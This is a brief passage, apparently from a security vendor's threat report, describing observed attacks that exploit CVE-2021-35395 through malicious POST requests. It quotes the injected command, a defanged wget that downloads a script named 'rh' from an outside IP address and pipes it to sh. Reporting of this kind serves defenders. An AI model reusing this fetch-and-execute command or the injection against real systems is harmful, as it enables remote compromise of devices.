@@ -1,0 +1,6 @@
+
+In one set of observed attacks, starting on August 24 th , the attackers sent POST requests similar to the following: Figure 1.
+Malicious POST request exploiting CVE-2021-35395.
+The injected command is: wget hxxp://37[.]0.11.132/
+rh -O - | sh which downloads and executes a script named ‘rh’: Figure 2.
+Malicious script downloaded by the injected command.
